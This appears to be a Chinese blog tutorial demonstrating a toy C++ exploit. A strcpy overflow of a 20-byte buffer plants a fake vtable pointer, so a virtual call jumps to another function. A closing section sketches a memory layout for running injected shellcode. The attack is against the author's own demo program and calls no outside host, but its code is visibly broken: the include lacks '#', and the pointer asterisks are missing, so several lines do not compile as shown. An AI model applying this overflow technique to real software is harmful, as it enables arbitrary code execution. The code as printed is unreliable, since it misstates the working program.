攻击虚函数（意思一下）

完全就是意思一下，
看起来有点假啊。。。
自己造个东西自己来玩。。

原理在上一篇的虚函数的底层机制

于是就可以通过改写虚函数表指针来达到执行其他代码的目的。

下面的shellcode先占够了24个位置，
然后在程序里面，我们把20开始的双字设置成新的虚函数表的地址。
因为表项只有1个，所以就用一个int型的变量来假装个表了。

程序：

include <iostream>

using namespace std ;

char shellcode[] = {
0x90 , 0x90 , 0x90 , 0x90 ,
0x90 , 0x90 , 0x90 , 0x90 ,
0x90 , 0x90 , 0x90 , 0x90 ,
0x90 , 0x90 , 0x90 , 0x90 ,
0x90 , 0x90 , 0x90 , 0x90 ,
0x90 , 0x90 , 0x90 , 0x90 ,
0x00
} ;

class mycls{
public:
    int other_member ;
    virtual fun(char s){
        cout<<”I’m fun”<<endl ;
        cout<<s<<endl ;
    }
} ;

void f(){
    cout<<”I’m f”<<endl ;
}

int main(){
    mycls c ;
    char buf[20] ;
    mycls p ;
    int pf ;
    pf = (int)f ;//(int)(int)&c ;
    (int)(shellcode + 20) = (int)&pf ;
    shellcode[24] = 0 ;
    strcpy(buf , shellcode) ;
    p = &c ;
    p->fun(buf) ;
    return 0 ;
}

结果：

I’m f
（外加一个报错框）

实际上的安排：

上面借助了其他一些地方，而实际上整个内存可以这么安排：

<shellcode + 4><nop><nop><nop>……<nop><real code><nop>…<nop><shellcode>

shellcode只开始的地址。于是最后一个<shellcode>作为数据淹没虚函数表的地址。
执行的时候，会把shellcode开始的地方当作是虚函数表。
然后查这个表的第一项，得到 shellcode+4 ，
把这个作为虚函数的实际地址调用，然后就进入到真正的代码段里面了。
